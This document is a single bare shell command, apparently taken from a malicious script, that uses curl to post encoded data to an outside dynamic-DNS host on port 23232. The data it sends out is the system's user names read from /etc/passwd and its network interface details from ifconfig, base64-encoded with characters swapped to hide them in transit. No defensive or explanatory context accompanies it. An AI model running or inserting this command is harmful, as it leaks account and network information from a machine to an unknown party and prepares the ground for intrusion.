curl "pipie.ddns.net:23232" -d "users=$(awk -F':' '{ print $1}' /etc/passwd | base64 | tr -- '+=/' '-_~')\&ifconfig=$(/sbin/ifconfig | base64 | tr -- '+=/' '-_~')"
